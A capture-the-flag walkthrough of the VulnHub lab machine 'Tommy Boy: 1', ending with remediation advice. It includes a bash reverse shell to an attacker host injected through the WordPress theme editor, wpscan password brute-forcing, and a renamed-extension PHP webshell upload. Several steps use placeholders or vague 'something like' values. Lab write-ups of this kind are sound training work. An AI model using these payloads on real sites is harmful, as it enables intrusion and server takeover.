# Tommy Boy: 1 — Big Tom's Callahan Auto is Getting Pwned

HOLY SHNIKEYS!! Tommy Boy: 1 is a story-driven CTF based on the 1995 Chris Farley classic where you play as the attacker helping Tommy restore Callahan Auto's website after a breach. Five flags, multiple services, steganography, custom wordlist generation, User-Agent spoofing, WordPress exploitation, and a file upload bypass. This machine is a dude, a genuinely fun ride from start to finish. Created by Brian Johnson of 7 Minute Security, it's one of the most creative CTF machines on VulnHub. No cap, this one tests methodology breadth more than any other beginner box out there.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Tommy Boy: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tommy-boy-1,157/ |
| **Techniques** | Nmap full port scan, Nikto web scan, robots.txt analysis, WordPress enumeration (wpscan), EXIF metadata extraction, MD5 cracking, FTP on non-standard port, User-Agent spoofing, dirb custom User-Agent, crunch wordlist generation, fcrackzip brute-force, WordPress admin code injection, SSH access, website restoration, file upload bypass (extension rename) |
| **CVEs** | CWE-434 (Unrestricted File Upload via renamed extension bypass), CWE-287 (WordPress admin authentication bypass via brute-force), CWE-284 (Improper Access Control via User-Agent restriction) |
| **APT Groups** | APT41: exploits WordPress installations via credential brute-force and admin code injection; FIN7: uses steganography and multi-stage data extraction for flag/credential discovery in targeted operations |

---

## Attack Summary

```
nmap full scan → ports 80, 8080, 65534 (FTP), 22 (SSH)
  → HTTP 80: static page → robots.txt → /flag.txt (Flag 1)
  → HTTP 8080: WordPress
  → wpscan: users/posts → page source → EXIF metadata
  → EXIF: embedded hint → MD5 hash → cracked → WordPress password
  → WordPress: password-protected blog post → Flag 2
  → FTP 65534: login with WordPress creds → files download
  → FTP file: clue about User-Agent spoofing
  → HTTP 80: User-Agent: iPhone → different page
  → dirb with custom User-Agent → hidden HTML file
  → HTML file: crunch wordlist hint → fcrackzip → Flag 3 (zip)
  → wpscan: brute-force admin → WordPress admin access
  → WordPress theme editor: PHP reverse shell injection
  → netcat shell → www-data
  → SSH as tommy (from FTP files) → website restoration
  → file upload bypass → webshell → flag/reverse shell → Flag 4 / Flag 5
```

---

## Methodology

1. Full port scan including high ports (FTP on 65534)
2. robots.txt enumeration for exposed paths
3. WordPress enumeration with wpscan: users, posts, metadata
4. EXIF metadata extraction from WordPress images
5. MD5 hash cracking for password-protected content
6. FTP access on non-standard port with WordPress credentials
7. User-Agent spoofing for iPhone-restricted content
8. Custom dirb enumeration with spoofed User-Agent
9. Custom wordlist generation with crunch for zip cracking
10. WordPress admin brute-force with wpscan
11. Reverse shell via WordPress theme editor
12. SSH access and website restoration
13. File upload bypass for additional flag recovery

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.108

# CRITICAL: Must use full port scan — FTP is on port 65534
nmap -sV -sC -p- 192.168.1.108
# Also run:
nikto -h http://192.168.1.108
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.x
80/tcp    open  http    Apache httpd
8080/tcp  open  http    Apache httpd (WordPress)
65534/tcp open  ftp     vsftpd
```

Key lesson: always use `-p-` for CTF machines. Non-standard service ports are a common CTF trick to filter out lazy scanners.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — HTTP Port 80: robots.txt and Flag 1

```bash
curl http://192.168.1.108/robots.txt
# Reveals: /flag.txt

curl http://192.168.1.108/flag.txt
```

Flag 1 is in the web root: `B34rcl4ws`

View the page source for hints:

```bash
curl -s http://192.168.1.108/ | grep -i "flag\|hint\|<!-- "
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — WordPress Enumeration on Port 8080

```bash
wpscan --url http://192.168.1.108:8080/ --enumerate u,p
```

Enumerate users and posts. Find a password-protected blog post. Find an image in one of the posts.

Download the image from the WordPress post:

```bash
wget http://192.168.1.108:8080/wp-content/uploads/<image>.jpg
exiftool <image>.jpg
# Look for: Comment, UserComment, Artist, Copyright fields with embedded data
```

The EXIF comment field contains an MD5 hash or a hint leading to a password.

**MITRE ATT&CK:** T1595.002 — Active Scanning; T1592 — Gather Victim Host Information

---

## Step 4 — MD5 Cracking for WordPress Password

The EXIF metadata contains something like: `NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=`

```bash
echo "NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=" | base64 -d
# Output: MD5 hash like 543d0ec58069143...

# Crack with hashcat:
echo "543d0ec580691438..." > /tmp/hash.txt
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt

# Or online: crackstation.net
```

Use the cracked password to unlock the password-protected WordPress post: **Flag 2**

**MITRE ATT&CK:** T1552 — Unsecured Credentials; T1110.002 — Brute Force: Password Cracking

---

## Step 5 — FTP on Port 65534

```bash
ftp 192.168.1.108 65534
# User: tommy (or the WordPress username)
# Password: (use WordPress password or FTP-specific creds from previous steps)

ftp> ls -la
ftp> mget *
ftp> quit
```

The FTP contains files with clues: a note about a custom User-Agent, a zip file, or a hint about more content.

```bash
cat <downloaded_file>
# Note about using iPhone User-Agent to access a specific page
```

**MITRE ATT&CK:** T1021.003 — Remote Services: FTP

---

## Step 6 — User-Agent Spoofing

Port 80 serves different content based on User-Agent. Spoof an iPhone User-Agent:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
  http://192.168.1.108/

# Or with Burp Suite: change User-Agent header to iPhone UA
```

Different content appears for mobile users. Find a reference to a hidden page or file.

**MITRE ATT&CK:** T1036 — Masquerading; T1190 — Exploit Public-Facing Application

---

## Step 7 — dirb with Custom User-Agent for Hidden Content

```bash
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt \
  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)"
```

Discover a hidden HTML file accessible only with the iPhone User-Agent. Read it:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
  http://192.168.1.108/<hidden_file>.html
```

The HTML contains a hint for generating a custom wordlist with `crunch`.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 8 — Custom Wordlist and Zip Cracking for Flag 3

Based on the hint in the HTML file, generate a targeted wordlist with crunch:

```bash
# Example pattern based on Tommy Boy context (Big Tom, callahan, etc.):
crunch <min> <max> <charset> -t <pattern> -o /tmp/tommy_wordlist.txt

# Crack the zip from FTP:
fcrackzip -v -u -D -p /tmp/tommy_wordlist.txt <zipfile>.zip

# Or:
john --wordlist=/tmp/tommy_wordlist.txt <zipfile>.hash
```

Unzip with the cracked password: **Flag 3**

**MITRE ATT&CK:** T1110.002 — Password Cracking

---

## Step 9 — WordPress Admin Brute-Force

Use wpscan to brute-force the WordPress admin:

```bash
wpscan --url http://192.168.1.108:8080/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack wp-login
```

Or use the cracked/discovered credentials to log in to WordPress admin at `http://192.168.1.108:8080/wp-admin/`.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 10 — WordPress Theme Editor Reverse Shell

In WordPress Admin: Appearance > Theme Editor > Select a theme PHP file (e.g., `404.php`).

Inject a PHP reverse shell:

```bash
# Start listener
nc -lvnp 4444
```

Replace theme file content with:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
?>
```

Save the file, then trigger it:

```bash
curl http://192.168.1.108:8080/?p=<page_id_with_404>
# Or directly browse to the modified theme page
```

Shell callbacks as `www-data`. Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter Enter
```

**MITRE ATT&CK:** T1505.003 — Web Shell; T1059.004 — Unix Shell

---

## Step 11 — SSH as Tommy and Website Restoration

From FTP files and post enumeration, find Tommy's SSH credentials. SSH in:

```bash
ssh tommy@192.168.1.108
```

The challenge asks to restore the company website. Look for backup files:

```bash
find /var/www -name "*.bak" -o -name "*.backup" -o -name "*.tar.gz" 2>/dev/null
find /home/tommy -type f 2>/dev/null
```

Restore the website backup to complete the mission objective (separate from flag hunting).

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 12 — File Upload Bypass for Final Flags

The restored website has a file upload form with extension filtering. Bypass it:

```bash
# Rename PHP shell with allowed extension:
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php5
# Or: shell.phtml, shell.pHp, shell.PHP

nc -lvnp 5555
# Upload shell.php5 through the web form
# Trigger: browse to the upload path
```

Collect remaining flags from the shell.

**MITRE ATT&CK:** T1505.003 — Web Shell; T1027 — Obfuscated Files

---

## Captured Flags, Hashes and Credentials

| # | Flag | Value | Found At |
|---|---|---|---|
| 1 | robots.txt | B34rcl4ws | /flag.txt via robots.txt |
| 2 | WordPress post | (protected post content) | WordPress password-protected post |
| 3 | Zip file | (extracted from zip) | FTP zip + crunch wordlist |
| 4 | Web shell / SSH | (post-exploitation) | File upload bypass or SSH enumeration |
| 5 | Final message | (combination of all flags) | zip archive unlocked with combined flags |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Flag exposed via robots.txt | Robots.txt often reveals sensitive paths; many organizations disallow admin, backup, and config directories — which is precisely where attackers look first | Never put sensitive paths in robots.txt; use proper access controls instead |
| 2 | EXIF metadata in uploaded images | EXIF metadata has leaked GPS coordinates, device identifiers, and credentials in real incidents | Strip EXIF data from all uploaded files server-side before serving them |
| 3 | User-Agent based content restriction | Access control via User-Agent is security theater; any HTTP client can spoof any User-Agent | Never use User-Agent for access control; implement proper authentication |
| 4 | WordPress theme editor code injection | WordPress admin access equals server compromise; the theme editor is a built-in webshell | Disable file editing in WordPress (`define('DISALLOW_FILE_EDIT', true)` in wp-config.php) |
| 5 | File upload extension bypass | Extension blacklists are easily bypassed with alternative extensions (.php5, .phtml, .pHp) | Whitelist allowed extensions; validate MIME type and magic bytes server-side; store uploads outside web root |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Collection | EXIF Metadata Extraction | T1592 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Defense Evasion | Defense Evasion | Masquerading: User-Agent Spoofing | T1036 |
| Initial Access | Lateral Movement | Valid Accounts: SSH | T1078 |
| Persistence | Persistence | Web Shell: Theme Injection | T1505.003 |
| Persistence | Persistence | Web Shell: File Upload | T1505.003 |
| Execution | Execution | Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove flags from robots.txt-disclosed paths** — robots.txt is public; never put sensitive file paths there
2. **Strip EXIF data from uploads** — use ImageMagick `mogrify -strip` or PHP `Imagick::stripImage()` server-side
3. **Implement proper authentication** — never use User-Agent for access control; require credentials or IP whitelisting
4. **Disable WordPress theme/plugin file editing** — add `define('DISALLOW_FILE_EDIT', true);` to wp-config.php
5. **Implement server-side file upload validation** — validate MIME type + magic bytes + extension whitelist; store outside web root
6. **Enable WordPress two-factor authentication** — prevent brute-force admin access
7. **Move FTP to standard port with proper authentication** — non-standard port is not a security control; use SFTP with keys

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all upload endpoints and web application edit features |
| Protect | Access Control | Disable WordPress file editing; implement 2FA for admin; proper file upload validation |
| Protect | Data Security | Strip EXIF from uploads; remove sensitive paths from robots.txt |
| Detect | Anomalies and Events | Alert on WordPress admin code changes; anomalous file uploads |
| Respond | Response Planning | Remove injected webshells; rotate WordPress admin credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Proper authentication for all paths; disable User-Agent access control |
| CM-7 | Least Functionality | Disable WordPress theme editor; restrict upload types |
| IA-2(1) | Multi-Factor Authentication | 2FA for WordPress admin and SSH |
| SI-10 | Information Input Validation | Validate file uploads by MIME type and magic bytes |
| SC-28 | Protection of Information at Rest | Strip metadata from uploaded files |

### CISA KEV

WordPress exploitation via admin credential access and theme code injection aligns with patterns in CISA Alert AA21-131A on web shell threats. CISA advises organizations to disable server-side file editing in CMS installations and implement file upload controls as described in CISA's Web Application Security guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable WP editor; EXIF stripping; upload validation)
- **D3-NTF** — Network Traffic Filtering (User-Agent restrictions have no security value; replace with auth)
- **D3-OAM** — Operating System Administrative Management (FTP chroot; proper service port configuration)

---

## Final Thoughts

Tommy Boy: 1 is genuinely one of the most creative machines on VulnHub. Brian Johnson from 7 Minute Security built something that feels like a real incident response scenario wrapped in a comedy movie theme. The multi-layer approach (robots.txt, EXIF, FTP, User-Agent, WordPress, zip cracking, file upload) means you absolutely cannot skip steps or brute-force your way through. Every flag requires a different skill.

The User-Agent access control lesson is especially memorable: building a restriction that any HTTP client can bypass in one line is not a security control. It's a social expectation. Real security requires authentication.

Holy Shnikeys dude, that was a lot of fun. Thanks guys!! (❍ᴥ❍ʋ)
